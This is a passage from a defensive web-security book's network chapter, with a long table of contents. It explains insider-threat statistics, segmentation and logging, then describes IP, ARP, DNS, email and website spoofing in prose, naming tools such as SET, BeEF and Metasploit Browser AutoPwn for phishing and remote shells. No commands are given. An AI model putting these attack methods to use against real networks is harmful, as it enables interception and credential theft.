            <a href='chap06.html#web-applications-countermeasures-lack-of-authentication-authorisation-session-management'>Lack of Authentication, Authorisation and Session Management</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-chosen-technologies'>Chosen technologies:</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-technology-and-design-decisions'>Technology and Design Decisions</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-reference-token-vs-json-web-token-jwt'>Reference Token vs JSON Web Token (JWT)</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-identityserver3'>IdentityServer3</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot'>MembershipReboot</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-external-identity-providers'>External Identity Providers</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-architecture'>Architecture</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-securing-sessions'>Securing Sessions</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-cryptography-on-the-client'>Cryptography on the Client (AKA Untrusted Crypto)</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-cryptography-on-the-client-web-cryptography-api'>Web Cryptography API</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-user-agent'>user agent</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-handle'><code>[[handle]]</code></a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-cryptokey-web-api-interface'><code>CryptoKey</code> (Web API interface)</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-the-other-two-web-crypto-api-interfaces'>The other two Web Crypto API interfaces</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-cryptohttpsdevelopermozillaorgen-usdocswebapicrypto-web-api-interface'>Crypto (Web API interface)</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-subtlecryptohttpsdevelopermozillaorgen-usdocswebapisubtlecrypto-web-api-interface'>SubtleCrypto (Web API interface)</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-cloud-storage'>Cloud Storage</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-protected-data-and-document-exchange'>Protected Data and Document Exchange</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-consuming-free-and-open-source'>Consuming Free and Open Source</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-process'>Process</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-consumption-is-your-responsibility'>Consumption is Your Responsibility</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-keeping-safe'>Keeping Safe</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-wget-curl-etc'>wget, curl, etc</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-npm-install'>npm install</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-consuming-free-and-open-source-keeping-safe-doppelganger-packages'>Doppelganger Packages</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-whitelisting-packageshttpsnpmenpmjscomdocsworkflowwhitelistinghtml-via-npm-enterprise'>Whitelisting Packages via npm Enterprise</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-consuming-free-and-open-source-tooling'>Tooling</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-npm-outdatedhttpsdocsnpmjscomclioutdated'>npm-outdated</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-npm-checkhttpswwwnpmjscompackagenpm-check'>npm-check</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-davidhttpsdavid-dmorg'>David</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-retirejshttpsgithubcomretirejsretirejs'>RetireJS</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-requiresafe'>requireSafe</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-bithoundhttpswwwbithoundio'>bithound</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-node-security-platformhttpsnodesecurityio-nsp'>Node Security Platform (NSP)</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-snykhttpssnykio'>Snyk</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-insufficient-attack-protection'>Insufficient Attack Protection</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-insufficient-attack-protection-waf'>Web Application Firewall (WAF)</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-application-intrusion-detection-and-response'>Application Intrusion Detection and Response</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-active-automated-prevention'>Active Automated Prevention</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap06.html#web-applications-risks-that-solution-causes'>4. SSM Risks that Solution Causes</a>
        <ul>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-visibility-7'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-insufficient-logging-and-monitoring-1'>Insufficient Logging and Monitoring</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-input-validation-filtering-and-sanitisation'>Lack of Input Validation, Filtering and Sanitisation</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-cross-site-scripting-xss'>Cross-Site Scripting (XSS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-cross-site-request-forgery-csrf-1'>Cross-Site Request Forgery (CSRF)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-injection-1'>Injection</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-sqli'>SQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-risks-that-solution-causes-nosqli'>NoSQLi</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-command-injection'>Command Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xml-injection'>XML Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xslt-injection'>XSLT Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xpath-injection'>XPath Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xquery-injection'>XQuery Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-ldap-injection'>LDAP Injection</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-captcha-1'>Captcha</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-management-of-application-secrets'>Management of Application Secrets</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-store-configuration-in-configuration-files'>Store Configuration in Configuration files</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-node-config-1'>node-config</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-windows-3'>Windows:</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-linux-1'>Linux:</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-least-privilege'>Least Privilege</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-location-1'>Location</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-data-store-compromise'>Data-store Compromise</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-risks-that-solution-causes-lack-of-authentication-authorisation-and-session-management'>Lack of Authentication, Authorisation and Session Management</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-risks-that-solution-causes-cryptography-on-the-client'>Cryptography on the Client (AKA Untrusted Crypto)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-consuming-free-and-open-source'>Consuming Free and Open Source</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-process-1'>Process</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-tooling'>Tooling</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-insufficient-attack-protection-1'>Insufficient Attack Protection</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap06.html#web-applications-costs-and-trade-offs'>5. SSM Costs and Trade-offs</a>
        <ul>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-visibility-8'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-insufficient-logging-and-monitoring-2'>Insufficient Logging and Monitoring</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-input-validation-filtering-and-sanitisation-1'>Lack of Input Validation, Filtering and Sanitisation</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-cross-site-scripting-xss-1'>Cross-Site Scripting (XSS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-cross-site-request-forgery-csrf-2'>Cross-Site Request Forgery (CSRF)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-injection-2'>Injection</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-sqli-1'>SQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-costs-and-trade-offs-nosqli'>NoSQLi</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-command-injection-1'>Command Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xml-injection-1'>XML Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xslt-injection-1'>XSLT Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xpath-injection-1'>XPath Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xquery-injection-1'>XQuery Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-ldap-injection-1'>LDAP Injection</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-captcha-2'>Captcha</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-management-of-application-secrets-1'>Management of Application Secrets</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-store-configuration-in-configuration-files-1'>Store Configuration in Configuration files</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-windows-4'>Windows:</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-linux-2'>Linux</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-least-privilege-1'>Least Privilege</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-location-2'>Location</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-data-store-compromise-1'>Data-store Compromise</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-authentication-authorisation-and-session-management'>Lack of Authentication, Authorisation and Session Management</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-costs-and-trade-offs-cryptography-on-the-client'>Cryptography on the Client (AKA Untrusted Crypto)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-consuming-free-and-open-source-1'>Consuming Free and Open Source</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-insufficient-attack-protection-2'>Insufficient Attack Protection</a>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap07.html#additional-resources'>Additional Resources</a>
    <ul>
      <li>
        <a href='chap07.html#leanpub-auto-vpsvps'>VPS</a>
      </li>
      <li>
        <a href='chap07.html#leanpub-auto-networknetwork'>Network</a>
      </li>
      <li>
        <a href='chap07.html#leanpub-auto-cloudcloud'>Cloud</a>
      </li>
      <li>
        <a href='chap07.html#leanpub-auto-web-applicationsweb-applications'>Web Applications</a>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap08.html#leanpub-auto-attributions'>Attributions</a>
    <ul>
      <li>
        <a href='chap08.html#leanpub-auto-introduction-1'>Introduction</a>
      </li>
      <li>
        <a href='chap08.html#leanpub-auto-vpsvps-1'>VPS</a>
      </li>
      <li>
        <a href='chap08.html#leanpub-auto-networknetwork-1'>Network</a>
      </li>
      <li>
        <a href='chap08.html#leanpub-auto-cloudcloud-1'>Cloud</a>
      </li>
      <li>
        <a href='chap08.html#leanpub-auto-web-applicationsweb-applications-1'>Web Applications</a>
      </li>
    </ul>
  </li>
</ul>

</ol>
</div>
<div id="leanpub-main" class="kramdown">
<h2 id="network">8. Network</h2>


<figure class="image center" style="width: 396px;">
  <img src="images/10000Network.png" alt="10,000' view of Network Security" style="width: 100%;" />
  <figcaption>10,000 view of Network Security</figcaption>
</figure>


<p>I had the pleasure of interviewing <a href="https://twitter.com/haroonmeer">Haroon Meer</a> on Software Engineering Radio for a <a href="http://www.se-radio.net/2017/09/se-radio-episode-302-haroon-meer-on-network-security/">show on Network Security</a>. Do your self a favour and listen to it. We cover most of the topics in this chapter plus more. While you are at it, check out the great Thinkst tools, also discussed near the end of the show:</p>

<ul>
  <li><a href="https://canarytokens.org/">Canarytokens</a></li>
  <li><a href="https://canary.tools/">Canary Tools</a></li>
</ul>

<h3 id="leanpub-auto-ssm-asset-identification">1. SSM Asset Identification</h3>
<p>Take results from the higher level Asset Identification section of the 30,000 View chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>. Remove any that are not applicable. Add any newly discovered.</p>

<p>Here are some possibilities to get you started:</p>

<ul>
  <li>Switches: Mainly because of the data that passes through them.</li>
  <li>Routers and layer 3 switches: Same as above, plus there will be a lot of sensitive network related information stored here.</li>
  <li>Syslog servers: For similar reasons to routers, plus events and sensitive information from all sorts of systems collected in one place.</li>
  <li>Visibility into what is actually happening in the communications between devices on your network.</li>
</ul>

<p>There will almost certainly be many others. Think about your network topology. What information is stored where and over which channels it may pass. If you have decided to hand your precious data over to a Cloud Service Provider (CSP), then you are not going to have much control over this and in most cases, your CSP will not have as much control as you would like either, we address this in the <a href="chap05.html#cloud">Cloud</a> chapter. Also think about the areas that may be easier to compromise than others and take this information into the next step.</p>

<h3 id="leanpub-auto-ssm-identify-risks-1">2. SSM Identify Risks</h3>
<p>Go through the same process as we did at the top level Identify Risks section in the 30,000 View chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>, but for the network.</p>

<ul>
  <li><a href="https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_006">MS Network Threats and Countermeasures</a></li>
</ul>

<p>Most types of security exploitation have a network involved somewhere. Reconnaissance generally utilises the internet at a minimum. <a href="chap06.html#web-applications">Application security</a> generally requires a network in order to access the target application(s). <a href="chap05.html#cloud">Cloud security</a> similarly depends on a network in order to access the target resources. Social Engineering as discussed in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a> leverages a network of people in order to access the human target. Even physical security (also discussed in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>) often involves different types of networks. When we think of networks, try not to be constrained to computer networks.</p>

<p>I also discussed <a href="http://www.se-radio.net/2017/09/se-radio-episode-302-haroon-meer-on-network-security/">Network Security</a> with Haroon Meer on a Software Engineering Radio show, which is well worth a listen during evaluation of both risks and countermeasures.</p>

<h4 id="network-identify-risks-fortress-mentality">Fortress Mentality</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-widespread-easy-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>This section takes the concepts from the section with the same name from the Physical chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers/">Fascicle 0</a>. The largest percentage of successful attacks come from within organisations. Usually the inside attacks get covered up, because the public image of the organisation is affected to a greater extent than if the organisation publicises the fact that they were compromised by someone on the other side of the world.</p>

<p>There is somehow still a misnomer that having perimeters will save us from the attackers. They may stop some of the noise from unmotivated attackers, but usually not a lot more.</p>

<p>IBM X-Force <a href="http://ibm.biz/2016CyberIndex">2016 Cyber Security Intelligence Index</a> provides the following information for 2014 and 2015, plus a lot more:</p>

<p><strong>2014</strong>:</p>

<p>Industries that experienced the highest incident rates were as listed descending:</p>

<ol class="numeric">
  <li>Financial services</li>
  <li>Information and communication</li>
  <li>Manufacturing</li>
  <li>Retail and wholesale</li>
  <li>Energy and utilities</li>
</ol>

<ul>
  <li>55% of all attacks were carried out by insiders</li>
  <li>31.5% were malicious inside actors</li>
  <li>23.5% were inadvertent inside actors</li>
</ul>

<p><strong>2015</strong>:</p>

<p>Industries that experienced the highest incident rates were as listed descending:</p>

<ol class="numeric">
  <li>Healthcare</li>
  <li>Manufacturing</li>
  <li>Financial services</li>
  <li>Government</li>
  <li>Transportation</li>
</ol>

<ul>
  <li>60% of all attacks were carried out by insiders</li>
  <li>44.5% were malicious inside actors</li>
  <li>15.5% were inadvertent inside actors</li>
</ul>

<p>The 2017 IBM X-Force <a href="https://public.dhe.ibm.com/common/ssi/ecm/wg/en/wgl03140usen/WGL03140USEN.PDF">Threat Intelligence Index</a> provides the following information for 2016, plus a lot more:</p>

<p>Industries that experienced the highest incident rates were as listed descending:</p>

<ol class="numeric">
  <li>Financial services</li>
  <li>Information and communications</li>
  <li>Manufacturing</li>
  <li>Retail</li>
  <li>Healthcare</li>
</ol>

<p>In 2017 X-Force segregated the data. in <strong>2016</strong>:</p>

<ul>
  <li>30% of all attacks were carried out by insiders</li>
  <li>7% were malicious inside actors</li>
  <li>23% were inadvertent inside actors</li>
</ul>

<p>In saying that, Financial services was:</p>

<ul>
  <li>58% of all attackers were carried out by insiders</li>
  <li>5% were malicious inside actors</li>
  <li>53% were inadvertent inside actors</li>
</ul>

<p>Healthcare was:</p>

<ul>
  <li>71% of all attackers were carried out by insiders</li>
  <li>25% were malicious inside actors</li>
  <li>46% were inadvertent inside actors</li>
</ul>

<p>Malicious inside actors can be disgruntled employees that may or not have left the organisation and still have access via an account or a back door they introduced or know about, they could also be opportunists looking to make some extra money by selling access or private information.</p>

<p>An inadvertent inside actor is usually someone that does not mean to cause harm, but falls prey to social engineering tactics often from malicious outsiders, as touched on in the People chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers/">Fascicle 0</a>. These are attacks such as phishing, or somehow being tricked or coerced into revealing sensitive information or carrying out an activity that will provide the attacker a foothold. The Social Engineers Playbook by Jeremiah Talamantes has many very useful and practical examples.</p>

<p>In all cases in 2016, we saw a significant trend of the inside actors shifting to the inadvertent, essentially this points to an emphasis on exploiting the organisations people (social engineering) with various attack strategies.</p>

<p>This clearly shows, that although our technological defences are improving slowly, our people are much slower to improve. Spending resources on areas such as network perimeters while neglecting our most valuable assets (our people), does not make sense.</p>

<p>Often workers bring their own devices to work, and bring their work devices home and back, potentially transferring malware from network to network, whether they be wired or wireless. Again though, people are the real issue here. No matter how good your technological solution is, people will circumvent it.</p>

<h4 id="network-identify-risks-lack-of-segmentation">Lack of Segmentation</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-easy-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Similar to the <a href="chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation">Overly Permissive File Permissions, Ownership and Lack of Segmentation</a> section in the VPS chapter, here we focus on the same concept but at the network layer.</p>

<p>Network segmentation is the act of splitting a network of computers that share network resources into multiple sub networks, whether it be real via routers, layer three switches, or virtual via VLANs.</p>

<p>Without segmentation, attackers once on the network have direct access to the resources on that network.</p>

<p>Having all or many resources from different trust boundaries on a monolithic network does nothing to constrain attackers or the transfer of malware. When we talk about trust boundaries we are talking about a configured firewall rather than just a router. A router routes, a firewall should deny or drop everything other than what you specify. That is right, it requires some thought of what should be allowed to enter the gateway interface and how it is then treated.</p>

<p>A good example of lack of segmentation is what is currently happening with the explosion of IoT devices. Why would your house-hold appliances need to be on the internet other than to perform unnecessary tasks, like a fridge ordering food, or an oven being able to tell you when your dinner is cooked, or worse, providing functionality to turn the appliance on and off, or worse still, being <a href="http://www.mirror.co.uk/news/technology-science/technology/hackers-use-fridge-send-spam-3046733#">commandeered by attackers</a> to do their bidding which is quite common now for home appliances that have next to no consciousness of security. Even if these functions were considered important enough to reveal open sockets from your home to the internet, surely it would be much safer to have these devices on a network segment with the least of privileges available, tight egress filtering, encrypted communications, and someone that knows how to configure the firewall rules on the segments gateway.</p>

<h4 id="leanpub-auto-lack-of-visibility-2">Lack of Visibility</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-difficult-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Check the <a href="chap03.html#vps-identify-risks-lack-of-visibility">Lack of Visibility</a> from the VPS chapter, there will be some cross over. If you do not have visibility of what is being communicated in your protocol stack, then the network protocols are open to being exploited. <a href="#network-identify-risks-data-exfiltration-infiltration-leveraging-dns">Data Exfiltration leveraging DNS</a> is one example of this. If you are unable to detect potential attacks on the network, before they occur, then the actual network components will be exploited.</p>

<h5 id="leanpub-auto-insufficient-logging">Insufficient Logging</h5>

<p>Similar to the <a href="chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting">Logging and Alerting</a> section in the VPS chapter, if you do not have a real-time logging system that sends your events of each network appliance off-site, encrypted, and is able to correlate, aggregate and even <a href="chap06.html#web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing">graph</a>, you will have a lack of visibility as to what is actually happening on your network.</p>

<h5 id="leanpub-auto-lack-of-network-intrusion-detection-systems-nids">Lack of Network Intrusion Detection Systems (NIDS)</h5>

<p><a href="chap04.html#network-countermeasures-lack-of-visibility-nids">Intrusion Detection Systems</a> play a big part in detecting and preventing the target from being exploited, they are another crucial component in your defence strategy.</p>

<h4 id="network-identify-risks-spoofing">Spoofing</h4>

<p>Spoofing on a network is the act of an entity (often malicious (Mallory), <a href="http://blog.binarymist.net/2015/04/25/web-server-log-management/#mitm">but not necessarily</a>) successfully masquerading/impersonating another (Bob) in order to receive information from Alice (sometimes via Eve) that should then reach Bob.</p>

<p>The following are some of the different types of network spoofing.</p>


<figure class="image center" style="width: 396px;">
  <img src="images/Spoof.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<h5 id="network-identify-risks-spoofing-ip">
  <a href="http://en.wikipedia.org/wiki/IP_address_spoofing">IP</a>
</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-common-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Setting the IP address in your header to the victims IP address.</p>

<p>Remember we did something similar to this under the Concealing NMap Source IP Address of the Reconnaissance section from the Process and Practises chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a> with nmap decoy host <code>-D</code> and idle scan <code>-sI</code>.</p>

<p>This is where a sending node will spoof its public IP address (not actually change its IP address) (by forging the header) to look like someone elses. When the message is received and a reply crafted, the entity creating the reply will look up its ARP table and send the reply to the impersonated entity because the MAC address is still associated with the IP address of the message it received. This sort of play is commonly used in Denial of Service (DoS) attacks, because the attacker does not need or want the response.</p>

<p>In a Distributed DoS (D-DoS) Often the attacker will impersonate the target (often a router or some server it wants to be brought to its knees) and broadcast messages. The nodes that receive these messages consult their ARP tables looking up the spoofed IP address and find the targets associated MAC address and reply to it. This way the replies will be sourced from many nodes. Thus swamping the targets network interface.<br />
Many load testing tools also use this technique to stress a server or application.</p>

<h5 id="network-identify-risks-spoofing-arp">ARP (Address Resolution Protocol)</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-common-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Telling your target that the MAC address it associates with a particular legitimate node (by way of IP address) is now your (the attackers/MItM) MAC address.</p>

<p>Taking the IP spoofing attack further. The MItM sends out ARP replies across the LAN to the target, telling it that the legitimate MAC address that the target associates with the MItM box has now changed to say the routers IP address. This way when the target wants to send a message to say the router, it looks up its ARP table for the routers IP address in order to find its MAC address and now gets the MItM MAC address for the routers IP address, thus the targets ARP cache is said to be poisoned with the MItM MAC address. The target goes ahead and sends its messages to the MItM box which can do what ever it likes with the data. Choose to drop the message or to forward it on to the router in its original or altered state.<br />
This attack only works on a LAN.<br />
The attack is often used as a component of larger attacks, harvesting credentials, cookies, CSRF tokens, hijacking. Even using TLS (in many cases TLS can be <a href="chap04.html#network-identify-risks-tls-downgrade">downgraded</a>). </p>

<p>There is a complete cloning example of a website, ARP spoof, DNS spoof and hands on hack, in the <a href="chap04.html#network-identify-risks-spoofing-website">website section below</a>.</p>

<p>Remember we set-up <a href="chap03.html#confirm-that-our-logs-are-commuting-over-tls">MItM with ARP spoofing</a> in the VPS chapter to confirm that our logs were in-fact encrypted in transit? Also checkout the MItM With TLS <a href="http://frishit.com/tag/ettercap/">http://frishit.com/tag/ettercap/</a></p>

<h5 id="network-identify-risks-spoofing-dns">DNS</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----difficult-uncommon-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Affects any domain name lookup. That includes email.
This type of attack could allow an intermediary to intercept and read all company emails for example. Completely destroying any competitive advantage. The victim may never know it is happened.<br />
DNS spoofing refers to an end goal rather than a specific type of attack. There are many ways to spoof a name server.</p>

<ul>
  <li>Compromise the name server itself potentially through its own vulnerabilities (<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447">Kaminsky bug</a> for example)</li>
  <li>Poison the cache of the name server</li>
  <li>Poison the cache of an upstream name server and wait for the downstream propagation</li>
  <li>MItM attack. A good example of this is:
    <ul>
      <li>cloning a website you hope your victim will visit</li>
      <li>offering a free Wi-Fi hot-spot attached to your gateway with DNS server provided  </li>
    </ul>

    <p>Your DNS server provides your cloned website IP address. You may still have to deal with X.509 certificates though, unless the website enforces TLS across the entire site, which is definitely my recommendation. If not, and the potential victim already has the websites certificate they are wanting to visit in their browser, then you will have to hope your victim will click through the warning or work out a <a href="chap04.html#network-identify-risks-tls-downgrade">TLS downgrade</a> which is going to be harder.</p>
  </li>
</ul>

<p>There is a complete cloning example of a website, ARP spoof, DNS spoof and hands on hack, in the <a href="chap04.html#network-identify-risks-spoofing-website">website section below</a></p>

<p><a href="http://www.question-defense.com/2012/12/14/dnschef-backtrack-privilege-escalation-spoofing-attacks-network-spoofing-dnschef">dnschef</a> is a flexible spoofing tool, also available in Kali Linux.</p>


<h5 id="network-identify-risks-spoofing-referrer">Referrer</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-common-average-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>This comes under the <a href="https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control">OWASP Top 10 A7 Missing Function Level Access Control</a></p>

<p>Often websites will allow access to certain resources so long as the request was referred from a specific page defined by the <code>referer</code> header.<br />
The referrer (spelled <code>referer</code>) field in HTTP requests can be intercepted and modified, so it is not a good idea to use it for authentication or authorisation. The Social Engineering Toolkit (SET) also exploits the <code>referer</code> header, as discussed in the hands on hack within the Spear Phishing section of Identify Risks in the People chapter of Fascicle 0.</p>

<h5 id="network-identify-risks-spoofing-email-address">EMail Address</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-widespread-average-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>The act of creating and sending an email with a forged sender address.
This is useful for spam campaigns sending large numbers of email and for social engineers often sending small numbers of email. The headers can be specified easily on the command line. The tools used essentially modify the headers: <code>From</code> and <code>Reply-To</code>.

The Social Engineer Toolkit (SET) can be handy for sending emails that appear to be from someone the receiver expects to receive email from. Set is capable of doing many tasks associated with social engineering. It even provides the capability to create executable payloads that the receiver may run once opening the email. Payloads in the form of a pdf with embedded exe, which Set allows you to choose form having Set do all the work for you, or you supplying the custom payload and file format.</p>

<p>Most people just assume that an email they have received came from the address it appears to be sent from. The Email headers are very easy to tamper with.
Often other types of spoofing attacks are necessary in order to have the <code>From</code> and <code>Reply-To</code> set to an address that a victim recognises and trusts rather than the attackers address or some other obviously obscure address.</p>

<p>There are also <a href="http://www.anonymailer.net/">on-line services</a> that allow the sending of email and specifying any from address.</p>

<p>Often the sender of a spoofed email will use a from address that you recognise in hope that you will click on a link within the email thus satisfying their phish.</p>

<h5 id="network-identify-risks-spoofing-website">Website</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----difficult-common-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>




<p>An attacker can clone a legitimate website (with the likes of the Social Engineering Kit (SET)) or the Browser Exploitation Framework (BeEF) and through social engineering, phishing, email spoofing or any other number of tricks (as discussed in the People chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>), coerce a victim to browse the spoofed website. In fact, if you clone a website that you know your victim visits regularly, then you can just do that and sit and wait for them to take the bait. Better still automote your attack so that when they do take the bait exploits are fired at them automatically. Once the victim is on the spoofed website, the attacker can harvest credentials or carry out many other types of attacks against the non-suspecting user.</p>

<p>The victim may visit the attackers cloned website due to ARP and/or DNS spoofing. Subterfuge is handy to run a plethora of attacks against the victims browser through the likes of the Metasploit Browser AutoPwn module. If &gt;0 attacks are successful (we have managed to install a root-kit), the attacker will usually get a remote command shell to the victims system by way of reverse or bind shell. Then simply forward them onto the legitimate website without them even being aware of the attack.</p>


<figure id="wdcnz-demo-3" class="image center" style="width: 396px;">
  <img src="images/HandsOnHack.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


